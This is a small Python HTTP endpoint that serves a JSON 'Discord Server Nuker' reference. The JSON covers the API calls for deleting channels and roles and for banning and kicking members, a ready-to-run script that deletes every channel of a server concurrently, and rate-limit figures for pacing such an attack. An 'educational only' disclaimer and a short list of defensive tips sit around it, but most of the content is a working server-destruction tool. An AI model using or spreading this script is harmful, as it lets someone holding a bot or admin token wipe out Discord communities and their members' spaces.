from http.server import BaseHTTPRequestHandler
import json

INFO = {
    "tool": "Discord Server Nuker — Reference",
    "disclaimer": "Technical reference only. Nuking Discord servers you do not own is illegal and violates Discord ToS (Section 8). This endpoint describes the API mechanics for educational/security-research purposes.",
    "what_is_a_nuke": "A 'nuke' in Discord context means rapid bulk deletion or modification of a server's structure — channels, roles, members — using the Discord API with admin/owner permissions.",
    "required_permissions": ["ADMINISTRATOR or MANAGE_CHANNELS, MANAGE_ROLES, KICK_MEMBERS, BAN_MEMBERS"],
    "api_endpoints_involved": {
        "list_channels": "GET /guilds/{guild_id}/channels",
        "delete_channel": "DELETE /channels/{channel_id}",
        "list_roles": "GET /guilds/{guild_id}/roles",
        "delete_role": "DELETE /guilds/{guild_id}/roles/{role_id}",
        "list_members": "GET /guilds/{guild_id}/members?limit=1000",
        "ban_member": "PUT /guilds/{guild_id}/bans/{user_id}",
        "kick_member": "DELETE /guilds/{guild_id}/members/{user_id}",
        "modify_guild": "PATCH /guilds/{guild_id} (name, icon, etc.)",
        "create_channel": "POST /guilds/{guild_id}/channels",
    },
    "python_snippet": """import requests, time, concurrent.futures

# EDUCATIONAL REFERENCE ONLY
TOKEN = "Bot YOUR_BOT_TOKEN"
GUILD_ID = "YOUR_SERVER_ID"
headers = {"Authorization": TOKEN, "Content-Type": "application/json"}

def delete_channel(channel_id):
    r = requests.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=headers)
    return r.status_code

def ban_member(guild_id, user_id):
    r = requests.put(f"https://discord.com/api/v10/guilds/{guild_id}/bans/{user_id}", headers=headers)
    return r.status_code

# Get all channels
channels = requests.get(f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels", headers=headers).json()
channel_ids = [c["id"] for c in channels]

# Delete all channels concurrently (respect rate limits)
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
    results = list(ex.map(delete_channel, channel_ids))
    
print(f"Deleted {sum(1 for r in results if r == 200)} channels")
""",
    "rate_limits": {
        "channel_delete": "~2-3 per second before 429",
        "ban": "~1-2 per second",
        "global": "50 requests/second"
    },
    "defensive_measures": [
        "Enable 2FA requirement on server (requires all admins to have 2FA)",
        "Audit log is always enabled — every action is logged",
        "Use role hierarchy carefully — bots cannot touch roles above their highest role",
        "Enable verification level and slowmode as deterrents"
    ]
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(INFO, indent=2).encode())

    def log_message(self, *a): pass
